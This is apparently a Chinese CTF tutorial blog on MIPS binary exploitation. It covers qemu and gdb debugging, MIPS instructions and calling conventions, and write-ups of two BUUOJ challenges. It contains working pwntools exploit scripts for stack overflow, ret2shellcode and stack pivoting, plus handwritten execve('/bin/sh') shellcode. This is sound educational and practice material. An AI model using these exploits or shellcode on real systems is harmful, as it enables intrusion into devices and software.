<p>然后再开一个终端执行下面的命令（<code>set endian big</code> 这里是设置为大端序，如果是小端序的话设置为 <code>little</code> ，如果想加载程序符号表的话，再添加一个 <code>symbol-file ./demo</code>） </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb-multiarch</span><br><span class="line">set architecture mips</span><br><span class="line">set endian big</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>实际调试情况如下图，如此就可以进入到 <code>gdb</code> 的调试界面了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112120319.png" alt="image-20230511212044987"></p>
<p>如果感觉每次都要敲这几条命令有点麻烦的话，可以编写一个 <code>shell</code> 脚本来简化工作，比如我们创建一个叫做 <code>loader.sh</code> 脚本，编写内容如下（纯属举例，具体情况具体处理）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set architecture mips</span><br><span class="line">set endian little</span><br><span class="line">symbol-file ./pwn2</span><br><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p>然后我们只需要执行 <code>gdb-multiarch</code> 后，执行一次 <code>source loader.sh </code> 命令即可。</p>
<h5 id="加载进程调试"><a href="#加载进程调试" class="headerlink" title="加载进程调试"></a>加载进程调试</h5><p>这个通常用于我们编写攻击脚本后，需要进行调试判断数据是否是预期的那样。</p>
<p>只需要在 <code>EXP</code> 中编写代码 <code>p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./demo&quot;])</code> 即可，这其实传入进去的就是一个命令包括参数列表。正常运行程序也是同理 <code>p=process([&quot;qemu-mips&quot;,&quot;./demo&quot;])</code></p>
<p>剩下的依旧是新开一个终端执行 <code>gdb-multiarch</code> 命令等等（同上）</p>
<h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><code>li</code> (Load Immediate)指令用于将一个立即数存入一个通用寄存器,	<code>li   $gp, 0x498300</code> 将 <code>$gp</code> 寄存器的值赋值为 <code>0x498300</code></p>
<p><code>lui</code> 指令将一个 <code>16</code> 位的立即数左移 <code>16</code> 位后存入目标寄存器中， <code>lui   $v0, 0x46</code> 是将 <code>0x46</code> 立即数左移  <code>16</code> 位后存入 <code>$v0</code> 寄存器，即 <code>$v0</code> 寄存器的值为 <code>0x460000</code></p>
<p><code>ori</code> 指令是 <code>MIPS</code> 汇编中的一种逻辑运算指令，它可以将一个寄存器的低 16 位与一个 16 位的立即数按位或运算，并将结果存入另一个寄存器中。<code>ori $t6,$t6,0x430a</code> 指令将 <code>t6</code> 寄存器与 <code>0x430a</code> 立即数进行或运算，将结果放回 <code>$t6</code></p>
<p><code>la</code> (Load Address) 指令用于将一个地址或标签存入一个寄存器，<code>la $v0, puts</code> 指令将 <code>puts</code> 函数地址存入 <code>$v0</code> 寄存器中</p>
<p><code>lw</code> (Load Word) 指令用于<strong>从一个指定的地址加载一个 <code>word</code> 类型的值</strong>到一个寄存器     <code>lw $v0, 0x14($fp)</code> 将 <code>$fp+0x14</code> 的位置中的数据存入到 <code>v0</code> 中</p>
<p><code>sw</code> (Store Word) 将源寄存器中的值存入指定地址，<code>sw   $ra, 0x24($sp) </code> 将 <code>$ra</code> 的值写入距离栈顶（<code>$sp</code>）偏移 <code>0x24</code> 的内存单元中</p>
<p><code>move</code> 指令用于寄存器之间值的传递，<code>move   $t5,$t1</code> 将 <code>$t1</code> 赋值给 <code>$5</code> </p>
<p><code>addi</code> 指令用于计算一个寄存器加上一个立即数，<code>addi $t0,$t1,5</code> 将 <code>$t1</code> 加上 <code>5</code> 之后将结果放为 <code>$t0</code></p>
<p><code>addu</code> 指令用于计算无符号数之间进行的加法操作，<code>addu $t0,$t1,$t2</code> 将 <code>$t1</code> 和 <code>$t2</code> 进行无符号相加，结果存储在 <code>$t0</code></p>
<p><code>add</code> 指令和 <code>addu</code> 一样，只不过进行的是有符号数之间的加法。</p>
<p><code>addiu</code> 指令将上面的 <code>addi</code> 和 <code>addu</code> 结合了一下，<code> addiu  $a1, $zero, 2</code> 进行的是将寄存器<code>$zero</code> 加上一个立即无符号数 <code>2</code> ，并将结果存回寄存器 <code>$a1</code> 中</p>
<p><code>jr</code> 是跳转指令，<code>jar $ra</code> 跳转到 <code>$ra</code> 寄存器指向的地址处</p>
<p><code>jal</code> 指令是跳转指令，<code>jal target</code> 复制当前的 <code>PC</code> 值到 <code>$ra</code> 寄存器，然后跳转到 <code>target</code> 处</p>
<p><code>bnez</code> 指令用于在寄存器的值不为零时进行分支跳转，<code>bnez   $v0, loc_4005E8</code> 表示当 <code>$v0</code> 不为零时跳转到 <code>0x4005E8</code> </p>
<p><code>b</code> 是无条件跳转指令，<code>b loc_400604</code>  直接跳转到 <code>0x400604</code> 地址处</p>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h4><p>在 <code>MIPS</code> 体系结构中有 <code>32</code> 个通用寄存器，在汇编程序中可以用编号 <code>$0-$31</code>表示，也可以用寄存器的名字表示</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305111218207.png" alt="image-20230511121821077" style="zoom:50%;" />



<h4 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h4><p><code>MIPS</code> 架构中定义了 <code>3</code> 个特殊的寄存器，分别是 <code>PC</code>（程序计数器）、<code>HI</code> (乘除结果高位寄存器)、<code>LO</code>（乘除结果低位寄存器）。在进行乘法运算时， <code>HI</code> 和 <code>LO</code> 保存乘法的运算结果，其中 <code>HI</code> 存储高 <code>32</code> 位，<code>LO</code> 存储低 <code>32</code> 位；在进行除法运算时， <code>HI</code> 保存余数， <code>LO</code> 存储商。</p>
<h3 id="MIPS32-架构知识"><a href="#MIPS32-架构知识" class="headerlink" title="MIPS32 架构知识"></a><code>MIPS32</code> 架构知识</h3><ul>
<li><p><code>MIPS</code> 固定 <code>4</code> 字节指令长度 </p>
</li>
<li><p>栈是从内存的高地址向低地址方向增长的</p>
</li>
<li><p>叶子函数：函数内部没有再调用其他函数</p>
</li>
<li><p>非叶子函数：函数内部调用其他函数的函数</p>
</li>
<li><p>流水线效应：在分析 <code>MIPS</code> 汇编代码时会发现，其跳转到函数或者分支跳转语句的下一条都是 <code>nop</code> （如下图），这是因为 <code>MIPS</code> 采用了高度的流水线，其中最重要的是跳转指令导致的<strong>分支延迟效应</strong>。在分支跳转语句后面那条语句叫做<strong>分支延迟槽</strong>，当跳转语句刚执行的一瞬间，跳转到的地址刚填充好（填充到程序计数器），<strong>还没有执行程序计数器中存放的指令，分支延迟槽的指令已经被执行了，这就是流水线效应</strong>（几条指令被同时执行，只是处于不同的阶段， <strong><code>MIPS</code> 不像其他架构那样存在流水线阻塞</strong>），为了避免出现问题，因此在分支跳转语句的下一条指令通常是 <code>nop</code> 指令或者其他有用的指令。</p>
</li>
<li><p>缓存刷新机制：<code>MIPS CPUs</code>有两个独立的 <code>cache</code> : <code>指令cache</code> 和 <code>数据cache</code> 。 指令和数据分别在两个不同的缓存中。当缓存满了，会触发 <code>flush</code> , 将数据写回到主内存。攻击者的攻击<code>payload</code> 通常会被应用当做数据来处理，存储在数据缓存中。当 <code>payload</code> 触发漏洞， 劫持程序执行流程的时候，会去执行内存中的 <code>shellcode</code> .如果数据缓存没有触发 <code>flush</code> 的话，<code>shellcode</code> 依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储 <code>shellcode</code> 的地址处随机的代码，导致不可预知的后果。(通常执行 <code>sleep(1)</code> 刷新)</p>
</li>
</ul>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305102022075.png" alt="image-20230510202231987"></p>
<h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305110732606.png" alt="image-20230511073238845" style="zoom:50%;" />



<p>函数调用时传参：如果函数的参数小于等于四个，那么会使用 <code>$a0 ~ $a3</code> 寄存器来存放参数。如果参数多于四个，那么多于的参数则存放到栈里（同时也会预留出前四个参数的内存空间，因为被调用者使用前四个参数时，会统一将参数放到保留的栈空间），具体情况是函数 <code>A</code> 调用函数 <code>B</code> ，调用者函数（函数<code>A</code> ）会在自己的栈顶预留一部分空间来保存被调用者（函数 <code>B</code> ）的参数，称之为调用参数空间（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092258483.png" alt="image-20230509225831965" style="zoom:50%;" />



<p>函数 <code>A</code> 调用函数 <code>B</code>。如果 <code>B</code> 是叶子函数，那么在调用 <code>B</code> 函数时，会将 <code>B</code> 函数的返回地址存入 <code>$ra</code> 寄存器；如果 <code>B</code> 是非叶子函数（<code>B</code> 函数内部调用了一个 <code>C</code> 函数），那么在跳转到 <code>B</code> 函数时，会将其返回地址先存入 <code>$ra</code> 寄存器中，随后在 <code>B</code> 函数内部再将 <code>$ra</code> 寄存器的值存入栈中（位于 <code>fp-0x4</code> 的位置，如下图）。当 <code>B</code> 函数调用 <code>C</code> 函数时，会将其返回地址存入 <code>$ra</code> 寄存器，在返回时执行 <code>jr $ra</code> 指令回到 <code>B</code> 函数。现在假设 <code>B</code> 函数已经执行完毕准备返回到 <code>A</code> 函数，会将原先存入栈里的返回地址读到 <code>$ra</code> 寄存器中，最后执行 <code>jr $ra</code> 指令，回到 <code>A</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305092257102.png" alt="image-20230509225747069" style="zoom:50%;" />



<h3 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h3><h4 id="axb-2019-mips"><a href="#axb-2019-mips" class="headerlink" title="axb_2019_mips"></a>axb_2019_mips</h4><h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112102666.png" alt="image-20230511210201613"></p>
<p>发现保护全关，并且是小端序</p>
<h5 id="解决报错"><a href="#解决报错" class="headerlink" title="解决报错"></a>解决报错</h5><p>尝试用 <code>qemu-mipsel ./pwn2</code> 运行时发现如下报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-mipsel: Could not open &#x27;/lib/ld-uClibc.so.0&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>

<p>这表明在 <code>/lib</code> 目录下缺少 <code>ld-uClibc.so.0</code> 文件，我们使用 <code>file pwn2</code> 来查看一下文件信息（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112045280.png" alt="image-20230511204507118"></p>
<p>发现动态链接器的路径是 <code>/lib/ld-uClibc.so.0</code> ，而在这个位置没有找到 <code>ld-uClibc.so.0</code> ，我们使用 <code>sudo find / -name &quot;ld-uClibc.so.0&quot; 2&gt;/dev/null</code> 命令搜索一下，发现是有这个  <code>ld-uClibc.so.0</code> 文件的，只不过不在 <code>/lib</code> 目录下（如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112049318.png" alt="image-20230511204913250"></p>
<p>因此创建一个软链接过去即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/ld-uClibc.so.0 /lib/</span><br></pre></td></tr></table></figure>

<p>然后我们尝试再次运行 <code>pwn2</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./qemu-mipsel ./pwn2                                   </span><br><span class="line">./pwn2: can&#x27;t load library &#x27;libc.so.0&#x27;</span><br></pre></td></tr></table></figure>

<p>这表明现在还缺少一个 <code>libc.so.0</code> 的库，我们使用 <code>ls /home/zikh/Desktop/mipsel-linux-uclibc/lib/</code> 命令，发现是有 <code>libc.so.0</code> 这个库的（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112028607.png" alt="image-20230511202846472"></p>
<p>因此我们依然给软链接到 <code>/lib</code> 目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ln -s /home/zikh/Desktop/mipsel-linux-uclibc/lib/libc.so.0 /lib/ </span><br></pre></td></tr></table></figure>

<p>此时程序可以运行成功（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112030731.png" alt="image-20230511203036662" style="zoom:50%;" />

<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112143512.png" alt="image-20230511214356466" style="zoom:50%;" />

<p>首先这里有一个 <code>read</code> 输入，随后 <code>printf</code> 函数是使用了 <code>%s</code> 将数据进行打印，在这里怀疑可能有机会泄露一些数据，我们通过调试验证一下（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112146239.png" alt="image-20230511214644840"></p>
<p>发现写入 <code>0x14</code> 字节的数据，确实可以顺带打印出来一个栈地址</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305112147526.png" alt="image-20230511214754487"></p>
<p>随后发现 <code>vuln</code> 函数存在栈溢出漏洞（如上）</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为有了栈地址，并且栈区是有可执行的权限，所以打一个常规的 <code>ret2shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120729296.png" alt="image-20230512072926146"></p>
<p>如上图所示，发现本地是通了的，因此思路没有任何问题，<code>EXP</code> 如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./pwn2&quot;</span>])</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,25419)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">offset=<span class="number">0x14</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*offset</span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello!, &quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*offset)</span><br><span class="line">stack_addr=u32(p.recv().ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;stack_addr&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x24</span>+p32(stack_addr-<span class="number">0x50</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()            </span><br></pre></td></tr></table></figure>





<p>不过这里在打远程的时候，明显发现泄露出来的并不是一个栈地址（因为本地和远程的环境不同，如下图），所以这个方法打远程是行不通的</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305120725360.png" alt="image-20230512072536085"></p>
<p>如果不泄露栈地址的话，我们考虑可以栈迁移到 <code>bss</code> 段上，并且往 <code>bss</code> 段写入 <code>shellcode</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122036129.png" alt="image-20230512203620008"></p>
<p>通过分析上面的汇编发现， <code>read</code> 的第二个参数 <code>$a1</code> 由 <code>fp</code> 控制，而通过阅读 <code>read</code> 函数后的汇编代码，存在一句 <code>lw    $fp, 0x38($sp)</code> ，又因为此处有栈溢出，相当于我们有一次任意地址写的机会。我们选择往 <code>bss</code> 段写入 <code>shellcode</code> ，然后寻找迁移的机会，迁移到 <code>bss</code> 段的 <code>shellcode</code> 执行。</p>
<p>执行完程序原本的 <code>read</code> 函数后，有一句 <code>lw   $ra,0x3c($sp)</code> 的汇编，我们将距离栈顶 <code>0x3c</code> 的位置放成上面提到的 <code>lw   $fp,0x38($sp)</code> 指令地址，以此跳转过去</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122116335.png" alt="image-20230512211611122"></p>
<p>下图为向 <code>bss</code> 段写入数据的 <code>read</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122119885.png" alt="image-20230512211952663" style="zoom:50%;" />



<p>当 <code>read</code> 往 <code>bss</code> 段读入完数据后，执行了 <code>mov   $sp,$fp</code> ，此时栈进行了迁移（<code>fp</code> 是最初控制的那个 <code>bss</code> 段地址）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122118517.png" alt="image-20230512211852230"></p>
<p>随后下一条指令 <code>lw   $ra,0x3c($sp)</code> 将 <code>$ra</code> 的值再次进行了设置，因为 <code>$sp</code> 是可控的 <code>bss</code> 段地址，所以 <code>$ra</code> 依然可控，我们将 <code>$ra</code> 设置为 <code>shellcode</code> 的起始地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122127368.png" alt="image-20230512212720766"></p>
<p>但戏剧的是，这种打法导致了远程通了，本地没通。因为本题环境的原因，<code>bss</code> 段是没有可执行权限的，而远程的 <code>bss</code> 段是有可执行权限的。</p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;mips&#x27;, os=&#x27;linux&#x27;, endian=&#x27;little&#x27;, word_size=32,log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25115</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;What&#x27;s your name: \n&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line">bss_addr=<span class="number">0x410ba0</span></span><br><span class="line">payload=<span class="string">b&quot;b&quot;</span>*<span class="number">0x20</span>+p32(bss_addr)+p32(<span class="number">0x4007E4</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x24</span>+p32(<span class="number">0x410be0</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305122131912.png" alt="image-20230512213146674"></p>
<h4 id="ycb-2020-mipspwn"><a href="#ycb-2020-mipspwn" class="headerlink" title="ycb_2020_mipspwn"></a>ycb_2020_mipspwn</h4><h5 id="保护策略-1"><a href="#保护策略-1" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142040351.png" alt="image-20230514204013277"></p>
<h5 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h5><p>本题与上一道的漏洞一样，同样是栈溢出。</p>
<p>采用的策略是打 <code>ret2shellcode</code></p>
<p>只不过本题的 <code>shellcode</code> 是手写的 <a href="#shellcode%E7%BC%96%E5%86%99">如何编写MIPS架构下的 shellcode</a> </p>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, endian=<span class="string">&#x27;little&#x27;</span>, word_size=<span class="number">32</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29366</span>)</span><br><span class="line"><span class="comment">#p=process([&quot;qemu-mipsel&quot;, &quot;-g&quot;, &quot;1234&quot;,&quot;./pwn2&quot;])</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Warrior,leave your name here:\n&quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">bss_addr=<span class="number">0x4115F0</span></span><br><span class="line">p.sendafter(<span class="string">&quot;Write down your feeling:\n&quot;</span>,<span class="number">0x38</span>*<span class="string">b&#x27;b&#x27;</span>+p32(bss_addr)+p32(<span class="number">0x400F54</span>))</span><br><span class="line">shellcode = asm(shellcraft.mips.linux.sh(),arch=<span class="string">&#x27;mips&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&quot;\x11\x01\x06\x24\xff\xff\xd0\x04\x00\x00\x06\x24\xe0\xff\xbd\x27\x14\x00\xe4\x27\x00\x00\x05\x24\xab\x0f\x02\x24\x0c\x00\x00\x00/bin/sh&quot;</span></span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x3c</span>+p32(<span class="number">0x411648</span>)+shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305142045142.png" alt="image-20230514204550938"></p>
<h3 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h3><h4 id="write-系统调用"><a href="#write-系统调用" class="headerlink" title="write 系统调用"></a><code>write</code> 系统调用</h4><p>我们先去尝试编写一段能够输出 <code>ABC\n</code> 字符串的 <code>shellcode</code></p>
<p>创建 <code>write.s</code> 文件，将下面的汇编代码写入文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">lui $t6,0x4142</span><br><span class="line">ori $t6,$t6,0x430a</span><br><span class="line">sw $t6,0($sp)</span><br><span class="line">li $a0,1</span><br><span class="line">addiu $a1,$sp,0</span><br><span class="line">li $a2,5</span><br><span class="line">li $v0,4004</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p> <code>.section .text</code> 指定了该段代码所在的节</p>
<p> <code>.globl __start</code> 表示将 <code>__start</code> 导出为全局符号（ <code>Global Symbol</code> ）。在C语言编写的程序中，程序的入口点通常被命名为 <code>_start</code>，而在汇编代码中通常使用 <code>__start</code></p>
<p> <code>.set noreorder</code> 禁止指令重排，确保汇编代码的执行顺序与源代码中指定的顺序一致。指令重排是编译器和处理器在优化代码执行速度时采用的一种技术，它可以改变指令的执行顺序，以便在不影响程序逻辑的情况下提高代码执行效率。</p>
<p><code>__start:</code> 是程序的入口点符号，在程序执行时将从这里开始执行指令。</p>
<p><code>addiu $sp,$sp,-32</code> 将开辟一个 <code>0x20</code> 大小的栈帧</p>
<p><code>lui $t6,0x4142</code> 是将 <code>0x4142</code> 左移 <code>16</code> 位后（也就是 <code>0x41420000</code> ）放入 <code>$t6</code> 寄存器。</p>
<p><code>ori $t6,$t6,0x430a</code> 将 <code>$t6</code> 与立即数 <code>0x430a</code> 进行或运算，所以 <code>$t6</code> 寄存器里会放 <code>0x4142430a</code> 这也就是 <code>ABC\n</code> 的 <code>ASCII</code> 码。</p>
<p>在看到这两条汇编语句的时候，我不禁疑惑起来，为什么不直接使用 <code>li $t6,0x4142430a</code> 指令呢，测试了一下编译链接之后的可执行文件依然是将这句指令转换成了 <code>lui $t6,0x4142   ori $t6,$t6,0x430a</code> ，最终查阅了资料发现在 <code>MIPS</code> 架构中立即数通常是 <code>16</code> 位的有符号整数（范围 <code>-32768 ~ 32767</code> ），如果需要使用一个超出这个范围的立即数，汇编器会自动将其拆分为两个 <code>16</code> 位的立即数，并使用 <code>lui</code> 和 <code>ori</code> 指令将其装载到寄存器中</p>
<p><code>sw $t6,0($sp)</code> 将 <code>ABC\n</code>这四个字符写入栈中</p>
<p><code>li $a0,1</code> 设置 <code>write</code> 系统调用的第一个参数，即标准输出流</p>
<p><code>addiu $a1,$sp,0</code> 将 <code>ABC\n</code> 的地址设置为 <code>write</code> 系统调用的第二个参数</p>
<p><code>li $a2,5</code> 设置 <code>write</code> 系统调用的第三个参数，即字符串长度为 <code>5</code> ，<code>ABC\n</code> 别忘记字符串末尾是还有一个 <code>\x00</code> 字符的</p>
<p><code>li $v0,4004</code> 设置 <code>$v0</code> 寄存器为 <code>write</code> 的系统调用号  <a target="_blank" rel="noopener" href="https://github.com/spotify/linux/blob/master/arch/mips/include/asm/unistd.h">查看 <code>MIPS</code> 架构的系统调用号</a></p>
<p><code>syscall</code> 触发系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mips-linux-gnu-as write.s -o write.o</span><br><span class="line">mips-linux-gnu-ld write.o -o write</span><br></pre></td></tr></table></figure>

<p>上面两条命令首先使用汇编器 <code>mips-linux-gnu-as</code> 将 <code>write.s</code> 中的汇编代码转换为机器码（生成文件 <code>write.o</code> ），再用链接器 <code>mips-linux-gnu-ld</code> 将刚生成的 <code>write.o</code> 链接为 <code>write</code> 可执行文件。</p>
<p>为了简化汇编和链接的过程，我们来编写一个 <code>shell</code> 脚本，起名为 <code>nasm.sh</code>（如下）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src=$1</span><br><span class="line">dst=$2</span><br><span class="line">mips-linux-gnu-as $1 -o s.o</span><br><span class="line">echo &quot;as ok&quot;</span><br><span class="line">mips-linux-gnu-ld s.o -o $dst</span><br><span class="line">echo &quot;ld ok&quot;</span><br><span class="line">rm s.o</span><br></pre></td></tr></table></figure>

<p>这样将编写的 <code>shellcode</code> 文件，变成可执行文件只需要使用 <code>./nasm.sh write.s write</code> 命令即可（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305131404932.png" alt="image-20230513140452675"></p>
<p>可以看到 <code>ABC\n</code> 字符串已经被成功输出，程序崩溃的原因是因为 <code>shellcode</code> 没有正常的退出，导致执行了不正确指令让程序崩溃。 想调试 <code>shellcode</code> 的话，方式和调试 <code>MIPS</code> 架构的程序是一模一样的。</p>
<h4 id="execve-系统调用"><a href="#execve-系统调用" class="headerlink" title="execve 系统调用"></a><code>execve</code> 系统调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl __start</span><br><span class="line">.set noreorder</span><br><span class="line">__start:</span><br><span class="line">li $a2,0x111</span><br><span class="line">p:bltzal $a2,p</span><br><span class="line">li $a2,0 </span><br><span class="line">addiu $sp,$sp,-32</span><br><span class="line">addiu $a0,$ra,20</span><br><span class="line">li $a1,0</span><br><span class="line">li $v0,4011</span><br><span class="line">syscall</span><br><span class="line">sc:</span><br><span class="line">    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</span><br></pre></td></tr></table></figure>

<p>前四行的解释上面已经提过了，就不再赘述。</p>
<p><code>li $a2,0x111</code> <code>p:bltzal $a2,p</code>   <code>li $a2,0</code> 这三条指令的目的就是为了把 <code>addiu $sp,$sp,-32</code> 这条指令的地址放入 <code>$ra</code> 寄存器中。</p>
<p><code>addiu $sp,$sp,-32</code> 是为了开辟一个新的栈帧，大小为 <code>0x20</code></p>
<p><code>addiu $a0,$ra,20</code> 这个指令中的 <code>20</code> 很讲究，这就要牵扯到 <code>sc:</code> 以及后面的东西了<code>0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68</code> 就是字符串 <code>/bin/sh</code> 。而这个字符串也是存放到了 <code>text</code> 段，就位于 <code>syscall</code> 后面的地址。因为 <code>MIPS</code> 架构中一个指令是固定的 <code>4</code> 字节，上面提到的 <code>$ra</code> 寄存器存储了 <code>addiu $sp,$sp,-32</code> 的地址，而这个指令距离 <code>/bin/sh</code> 中间还有 <code>5</code> 个指令，<code>4*5 = 20</code> 字节。因此这里的 <code>$a0</code> 拿到了 <code>/bin/sh</code> 字符串的地址。</p>
<p>目的是执行 <code>execve(&quot;/bin/sh\x00&quot;,0,0)</code> ，所以我们将 <code>$a1</code> <code>$a2</code> 寄存器设置为 <code>0</code> ，使用 <code>li</code> 指令进行赋值即可，<code>execve</code> 系统调用号为 <code>4011</code>。</p>
